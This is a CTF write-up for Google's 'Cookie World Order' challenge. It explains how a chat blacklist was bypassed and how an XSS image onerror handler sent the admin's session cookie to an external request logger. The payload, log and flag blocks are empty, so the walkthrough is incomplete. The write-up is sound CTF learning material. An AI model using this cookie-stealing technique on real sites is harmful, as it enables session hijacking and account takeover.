# Cookie World Order

## Description
> Good job! You found a further credential that looks like a VPN referred to as the cWo. The organization appears very clandestine and mysterious and reminds you of the secret ruling class of hard shelled turtle-like creatures of Xenon. Funny they trust their security to a contractor outside their systems, especially one with such bad habits.  Upon further snooping you find a video feed of those "Cauliflowers" which look to be the dominant lifeforms and members of the cWo. Go forth and attain greater access to reach this creature!

## Solution
We visit the website and get a livestream video of a cauliflower and a chat interface:
```html
              Admin 
              Look at my beautiful garden! 
```
"Admin" is online and obviously we need to use XSS to steal his cookie.
The server had a basic blacklist protection, so basic attempts returned an error message ("HACKER ALERT!"):
```console
root@kali:/media/sf_CTFs/google/Cookie_World_Order# curl "https://cwo-xss.web.ctfcompetition.com/send" -X POST --data "message="
{"message":"HACKER ALERT!","profile_url":"/static/img/profile.png","username":"brewtoot"}
```
However it was still possible to bypass the blacklist with a pretty simple input:
```console
root@kali:/media/sf_CTFs/google/Cookie_World_Order# curl "https://cwo-xss.web.ctfcompetition.com/send" -X POST --data "message="
{"message":"","profile_url":"/static/img/profile.png","username":"brewtoot"}
```
Our input is:
```html
```
We create an image with a source that doesn't exist. Upon error, the browser will attempt run the `onerror` logic which will try to load a different image from our [Request Bin](http://requestbin.fullcontact.com) - a free service that logs every request it gets. We crafted the URI of the image to be composed of the session cookie, allowing us to steal it.
After a few seconds, we see the following log:
```

We decode the base64 string and get the flag:
